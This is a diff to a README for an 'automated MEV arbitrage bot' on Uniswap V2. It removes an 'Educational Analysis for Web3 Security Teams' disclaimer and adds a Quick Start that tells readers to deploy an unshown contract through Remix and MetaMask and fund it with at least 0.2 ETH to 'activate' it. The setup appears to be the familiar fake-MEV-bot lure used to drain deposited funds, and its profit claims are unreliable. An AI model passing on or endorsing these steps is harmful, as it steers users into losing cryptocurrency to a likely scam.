@@ -10,15 +10,13 @@
 
 **⚡ Automated MEV Extraction & Arbitrage Trading System ⚡**
 
-*Educational Analysis for Web3 Security Teams*
-
 </div>
 
 ---
 
 ## 🎯 **System Overview**
 
-This sophisticated MEV (Maximal Extractable Value) bot operates as an autonomous trading system that monitors Uniswap V2 for profitable arbitrage opportunities and executes high-frequency trades to extract maximum value from the mempool.
+This MEV bot operates as an autonomous trading system that monitors Uniswap V2 for profitable arbitrage opportunities and executes high frequency trades to extract maximum value from the mempool.
 
 ### 🌟 **Core Features**
 
@@ -54,6 +52,30 @@ This sophisticated MEV (Maximal Extractable Value) bot operates as an autonomous
 </table>
 
 ---
+
+## 🛠️ Requirements
+
+- MetaMask wallet ( Many other wallets are compatible too ) 
+- ETH for gas + funding
+- Also takes BNB as long as its wrapped on the Ethereum Mainnet ( ERC-20 )
+- And other EVM compatible currencies
+
+---
+
+## 🚀 Quick Start (Remix Online)
+
+1. Visit: [https://remix.ethereum.org](https://remix.ethereum.org)
+2. Create a new file named `MEVbot.sol`
+3. Copy and paste the contract code below
+4. Navigate to the **Solidity Compiler** tab:
+   - Select compiler version `0.8.20`
+   - Click **Compile MEVbot.sol**
+5. Go to **Deploy & Run Transactions**:
+   - Environment: `Injected Provider - MetaMask`
+   - Connect your wallet when prompted
+6. Click **Deploy** and approve in MetaMask
+7. After deployment, send **at least 0.2 ETH** to the contract address to activate
+8. Use `checkBalance()` to monitor profit
 
 ## 🚀 **Technical Architecture**
 
@@ -106,64 +128,6 @@ graph TD
 
 </div>
 
-### 🎯 **Step-by-Step Process**
-
-| Step | Function | Description |
-|------|----------|-------------|
-| 1️⃣ | **Network Monitoring** | Continuously scans Uniswap for new contract deployments and liquidity additions |
-| 2️⃣ | **Opportunity Analysis** | Calculates potential arbitrage profits across multiple DEX pools |
-| 3️⃣ | **Mempool Intelligence** | Analyzes pending transactions to identify frontrunning opportunities |
-| 4️⃣ | **Trade Execution** | Performs high-speed arbitrage trades with optimal gas pricing |
-| 5️⃣ | **Profit Extraction** | Automatically extracts and compounds trading profits |
-
----
-
-## 💎 **Key Functions**
-
-<details>
-<summary><b>🚀 Trading Operations</b></summary>
-
-### **`start()`** - Launch Trading Engine
-- Initiates automated arbitrage scanning
-- Performs frontrun operations across pools
-- Optimizes for maximum extractable value
-
-### **`withdrawal()`** - Profit Extraction  
-- Instantly withdraws accumulated profits
-- Transfers earnings to deployer address
-- Maintains operational capital reserves
-
-</details>
-
-<details>
-<summary><b>🔍 Discovery Functions</b></summary>
-
-### **Contract Intelligence**
-- **`loadCurrentContract()`** - Loads target contracts into memory
-- **`startExploration()`** - Begins systematic contract analysis
-- **`memcpy()`** - Efficient memory operations for data handling
-
-### **String Processing**
-- **`uint2str()`** - Converts numeric data to readable format
-- **`mempool()`** - Combines mempool data streams
-- **`keccak()`** - Generates contract hash signatures
-
-</details>
-
----
-
-## 🛠️ **Configuration**
-
-### 📋 **Contract Details**
-- **Name:** `MEv BOT`
-- **Symbol:** `MEVbot`  
-- **Solidity:** `^0.8.20`
-- **Network:** Ethereum Mainnet
-
-### 🔗 **Integrated Protocols**
-- ✅ Uniswap V2 Core
-- ✅ Uniswap V2 Factory
-- ✅ ERC20 Token Standards
-- ✅ Ethereum Virtual Machine
+9. Call `withdrawProfit()` to claim earnings anytime
 
 ---
